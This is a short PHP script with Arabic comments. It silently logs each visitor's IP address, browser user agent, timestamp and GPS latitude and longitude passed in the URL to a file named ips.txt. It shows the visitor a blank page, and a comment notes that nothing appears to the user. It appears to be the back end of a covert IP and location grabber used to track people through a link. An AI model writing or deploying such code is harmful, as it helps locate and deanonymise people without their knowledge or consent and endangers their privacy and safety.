<?php
$ip   = $_SERVER['REMOTE_ADDR'];
$ua   = $_SERVER['HTTP_USER_AGENT'];
$time = date("Y-m-d H:i:s");

// التحقق من وجود GPS
$lat = isset($_GET['lat']) ? $_GET['lat'] : "N/A";
$lon = isset($_GET['lon']) ? $_GET['lon'] : "N/A";

$log = "IP: $ip | User-Agent: $ua | Time: $time | Lat: $lat | Lon: $lon\n";

file_put_contents("ips.txt", $log, FILE_APPEND);

echo ""; // لا يظهر شيء للمستخدم
?>
